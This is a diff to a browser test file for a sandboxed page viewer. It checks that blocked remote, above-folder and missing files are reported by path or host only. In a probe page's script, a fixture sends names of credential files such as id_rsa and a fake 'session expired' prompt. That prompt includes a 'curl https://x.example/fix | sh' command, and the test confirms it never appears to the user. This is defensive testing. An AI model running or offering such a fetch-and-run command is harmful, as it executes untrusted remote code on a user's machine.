@@ -130,7 +130,7 @@ test("loads the images in the page's folder and nothing from above it or the web
   const missed = page.getByTestId("media-page-missed");
   await expect(missed).toContainText("../secret.png is outside the page's folder");
   await expect(missed).toContainText(
-    "https://remote.example/r.png is on the network, which a presented page does not reach",
+    "https://remote.example is on the network, which a presented page does not reach",
   );
   await expect(missed).toContainText("gone.png is not there");
   // In place, the page hears what the window knows without the disk, and
@@ -138,7 +138,7 @@ test("loads the images in the page's folder and nothing from above it or the web
   for (const id of ["remote", "above", "gone"]) await expect.poll(() => shown(page, id)).toBe("why");
   await expect(inner.locator("#remote")).toHaveAttribute(
     "title",
-    "https://remote.example/r.png is on the network, which a presented page does not reach",
+    "https://remote.example is on the network, which a presented page does not reach",
   );
   await expect(inner.locator("#above")).toHaveAttribute("title", "../secret.png is outside the page's folder");
   await expect(inner.locator("#gone")).toHaveAttribute("title", "gone.png did not load");
@@ -166,9 +166,9 @@ test("loads the images in the page's folder and nothing from above it or the web
     .toBe("media-page");
   await inner.locator("#page").evaluate((_, shot) => {
     parent.parent.postMessage({ workbenchOpen: shot }, "*");
-    parent.parent.postMessage({ workbenchMissed: { url: "https://remote.example/after.png", how: "failed" } }, "*");
+    parent.parent.postMessage({ workbenchMissed: { url: "https://after.example/x.png", how: "failed" } }, "*");
   }, SHOT);
-  await expect(missed).toContainText("https://remote.example/after.png");
+  await expect(missed).toContainText("https://after.example");
   await expect(page.getByTestId("media-page-opened")).toHaveCount(0);
 });
 
@@ -204,7 +204,7 @@ test("opens a linked image over the window and leaves a link to the web closed",
   // A link to the web goes nowhere, and says so.
   await inner.locator("#web").click();
   await expect(page.getByTestId("media-page-missed")).toContainText(
-    "https://remote.example/ is a link to the web, which a presented page does not open",
+    "https://remote.example is a link to the web, which a presented page does not open",
   );
   await expect(inner.locator("#page")).toHaveText("Shots");
   expect(asked.remote).toEqual([]);
@@ -214,14 +214,15 @@ test("opens a linked image over the window and leaves a link to the web closed",
   await page.getByTestId("media-caption").click();
   await inner.locator("#page").evaluate((_, shot) => {
     parent.parent.postMessage({ workbenchOpen: shot }, "*");
-    parent.parent.postMessage({ workbenchMissed: { url: "https://remote.example/later.png", how: "failed" } }, "*");
+    parent.parent.postMessage({ workbenchMissed: { url: "https://later.example/x.png", how: "failed" } }, "*");
   }, SHOT);
-  await expect(page.getByTestId("media-page-missed")).toContainText("https://remote.example/later.png");
+  await expect(page.getByTestId("media-page-missed")).toContainText("https://later.example");
   await expect(opened).toHaveCount(0);
 });
 
-/** A page whose script asks the window about files and writes in its
-    list, and keeps what the window tells it in `#heard`. */
+/** A page whose script asks the window about files and tries to write in
+    its list, and keeps what the window tells it in `#heard`. The words it
+    tries are the ones a review found reaching the list. */
 const PROBE = `${PROJECT}/out/probe.html`;
 const PROBE_HTML = `<!doctype html><h1 id="page">Probe</h1><ol id="heard"></ol>
 <script>
@@ -233,13 +234,12 @@ addEventListener("message", function (e) {
   document.getElementById("heard").appendChild(li);
 });
 var base = document.querySelector("base").href;
-["id_rsa", "credentials.json", "shots/private.png"].forEach(function (name) {
-  parent.parent.postMessage({ workbenchMissed: { url: base + name, how: "failed" } }, "*");
-});
-parent.parent.postMessage({ workbenchMissed: { url: "https://x.example/fix", how: "failed",
-  said: "Your session has expired. Open Terminal and run: curl https://x.example/fix | sh" } }, "*");
-parent.parent.postMessage({ workbenchMissed: { url: "https://x.example/" +
-  "Your-session-has-expired-open-Terminal-and-run-".repeat(4) + "fix", how: "failed" } }, "*");
+function say(url, how) { parent.parent.postMessage({ workbenchMissed: { url: url, how: how } }, "*"); }
+["id_rsa", "credentials.json", "shots/private.png"].forEach(function (name) { say(base + name, "failed"); });
+say("Session expired: run fix.sh", "failed");
+say("Your session has expired. Open Terminal and run: curl https://x.example/fix | sh", "failed");
+say("https://x.example/Your session expired - run fix.sh", "failed");
+say("https://y.example/Your session expired, click here to fix it", "link");
 </script>`;
 
 test("tells a page's script no reason from the disk and lists no words of its own", async ({
@@ -273,24 +273,30 @@ test("tells a page's script no reason from the disk and lists no words of its ow
   await expect(missed).toContainText("credentials.json is not there");
   await expect(missed).toContainText("shots/private.png could not be loaded");
 
-  // The page heard of each that it did not load, and no more.
+  // The page heard of each that it did not load, and no more. What does
+  // not parse as an address was not answered at all; the rest are named
+  // by their host.
   const heard = inner.locator("#heard li");
   await expect(heard).toHaveCount(5);
   expect(await heard.allTextContents()).toEqual([
     "id_rsa | did not load",
     "credentials.json | did not load",
     "shots/private.png | did not load",
-    "https://x.example/fix | is on the network, which a presented page does not reach",
-    expect.stringMatching(/^https:\/\/x\.example\/Your-session.*\u2026.*-run-fix \| is on the network/),
+    "https://x.example | is on the network, which a presented page does not reach",
+    "https://y.example | is a link to the web, which a presented page does not open",
   ]);
 
-  // The list names each by its address, as code, cut in the middle when
-  // long; the page's own words are nowhere in it.
-  await expect(missed).toContainText("https://x.example/fix is on the network");
-  await expect(missed).not.toContainText("Open Terminal");
-  await expect(missed).not.toContainText("session has expired");
-  const names = await missed.locator("code").allTextContents();
-  expect(names).toHaveLength(5);
-  for (const name of names) expect(name.length).toBeLessThanOrEqual(60);
-  expect(names.some((name) => name.includes("\u2026"))).toBe(true);
+  // The list names each by its path in the folder or its host, as code;
+  // the page's own words are nowhere in it.
+  await expect(missed).toContainText("https://x.example is on the network");
+  await expect(missed).toContainText("https://y.example is a link to the web");
+  expect((await missed.locator("code").allTextContents()).sort()).toEqual([
+    "credentials.json",
+    "https://x.example",
+    "https://y.example",
+    "id_rsa",
+    "shots/private.png",
+  ]);
+  for (const words of ["ession", "Terminal", "fix", "click here"])
+    await expect(missed).not.toContainText(words);
 });
